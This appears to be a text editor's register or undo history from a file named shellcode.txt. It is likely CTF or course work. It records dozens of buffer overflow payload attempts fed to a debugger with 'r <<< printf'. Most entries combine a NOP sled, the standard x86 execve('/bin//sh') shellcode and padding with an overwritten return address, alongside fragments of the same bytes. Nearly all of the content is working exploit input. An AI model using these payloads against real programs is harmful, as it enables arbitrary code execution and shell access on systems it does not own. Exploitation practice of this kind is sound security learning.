	r <<< `printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
db0ad88284921415bdb8d3b413e4ec8e|file:///home/neo/ccsc/guydebois/shellcode.txt|8|88|v|text
	\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
a5707da0da8be0e7b5a8d6afadb62a16|file:///home/neo/ccsc/guydebois/shellcode.txt|8|88|v|text
	\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
3d2e0ce7cdd9c9584ecbcc462b858c7e|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
75be15eb174bdd483a3f93ad02f48619|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
aaa24f6ccbd620a9adddb40d6b9e12fc|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
31539dcb03326339fec70dab0b44f7ef|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
09bc2b15d1cca4754c1ece90f8dfa435|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
ea58e91b912a4fc7cdf74433aa3ba9ed|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
1001b26fdfabee8a1650ac2cd92187ce|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
c11448e137d948b030ce6a3a48569fa2|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
3a96c09539a4e79120489832c0e49245|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
6458243158912df6b91e49acaad9ca9b|file:///home/neo/ccsc/guydebois/shellcode.txt|8|300|v|text
	\x90\x90\x
5cc36315557ba552147ac50fe894c534|file:///home/neo/ccsc/guydebois/shellcode.txt|8|300|v|text
	90\x90\x90
003e6b2449b5d64d1742e9363a12dabe|file:///home/neo/ccsc/guydebois/shellcode.txt|8|300|v|text
	\x90\x90\x90\x90\x90\x90\x90\x
12b1c924624ef69dc681770eb0384907|file:///home/neo/ccsc/guydebois/shellcode.txt|8|300|v|text
	90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
681aba0cbbcd807faed2e33a3be575b3|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
5614bc976e992c5806d915f47066a9d7|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00"`
47989bb1e4c4d3abc6195030624eadab|file:///home/neo/ccsc/guydebois/shellcode.txt|10|108|v|text
	\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
c37eb85c90e922cee9a050c3748be2a3|file:///home/neo/ccsc/guydebois/shellcode.txt|10|108|v|text
	\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
085795e914e12083a57ea7e0f56bcce7|file:///home/neo/ccsc/guydebois/shellcode.txt|10|108|v|text
	\x90\x90\x90\x90\x90
eda51d29787994f60c5e11928c7bc30b|file:///home/neo/ccsc/guydebois/shellcode.txt|10|108|v|text
	\x90\x90
b3673087412eb9568d8d7389647767d9|file:///home/neo/ccsc/guydebois/shellcode.txt|10|108|v|text
	\x90
ed0ae46af2c01415b17263f94560eb0a|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
97c4c3c18c666a142fa5a653772d4423|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
7ac4dc90273a3968fc6e63af92d2aa8e|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
5f61c0ccad4cac44c75ff505e1f1e537|file:///home/neo/ccsc/guydebois/shellcode.txt|10|108|v|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
e2e762b4dbe0c170c506a27a4a5b2596|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
c5d93bfe0247fa4dbe133d83f4661da7|file:///home/neo/ccsc/guydebois/shellcode.txt|10|218|v|text
	\x00\x00
2296504f902bbce0c946e20fd6570789|file:///home/neo/ccsc/guydebois/shellcode.txt|9|1|V|text
	
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40"`
d9f488b48d38631cf9abdbbac91af67b|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbb\x67\x06\x40"`
22d42eb002cefa81e9ad604ea57bc01d|file:///home/neo/ccsc/guydebois/shellcode.txt|10|184|v|text
	aaaaaaaaaaaaaaaaaaaa
cea41d0d38e2815477eb76b643692a12|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40"`
ab868aca382dc956275699ef0d78d1bf|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
f863eb434099c9c1d2685314d0dd7710|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
65e9d79ae55b0ef3e8212a2215992046|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
37a0b536ac9e8eed6241e0f8fb19c7f4|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x 69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
9c405d80abf0daf809ac3767c82702d4|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x 69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
1044605498ee7623ac73ede8c55a6b24|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
49e2bc39142d0bf4edee4fbc47ce6e4c|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
503ab7abd3b83053929cec31a83fc9f3|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
971b1fded06755c94cc784f8b868aec6|file:///home/neo/ccsc/guydebois/shellcode.txt|10|44|v|text
	\x68\x68\x2f\x62\x69
d7bbe4c11b07e8f687681d968eb323f0|file:///home/neo/ccsc/guydebois/shellcode.txt|10|44|v|text
	\x6e\x89\xe3\x50\x53
09cd2e038d906ad0db4ec2f3df7f152f|file:///home/neo/ccsc/guydebois/shellcode.txt|10|44|v|text
	\x89\xe1\xb0\x0b\xcd
fda0921c345c3069c47e607eb7a03f67|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x89aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
80415d5470b05899ca0120f0c723111e|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x89aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
e2c02584156e0302b8c3c36b2e915886|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
fd9f12312fc02aa6909da10b5c92719d|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
3f5c776f822b54581bed297be6f5231c|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
a4a6a9404cb61bc9c889ad5f37a9d558|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
26ededc480979402f4869b90761a0aad|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
b3fbbfc9bc178a3463f3b4cfa1398d90|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
4d0461ff3fb58020c578b3835eee3cf2|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
2d4b6877accaf4ef3ce87fea9dbb3702|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
46d3b2a768c0d26a100e3d05c8f937f4|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
42853f0a407856f3730012534408c067|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
8adb3a91ba98f62b84561c5c1fc02649|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
58e59974976d3b8c60b6e0734f9b7fb8|file:///home/neo/ccsc/guydebois/shellcode.txt|6|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaaaaa\x67\x06\x40"`
96e6842d2f988b9fba2e47858d917cf0|file:///home/neo/ccsc/guydebois/shellcode.txt|6|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaa\x67\x06\x40"`
be45a51a977d42efa7cf9c119b7dce63|file:///home/neo/ccsc/guydebois/shellcode.txt|6|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaa\x67\x06\x40\x00\x00"`
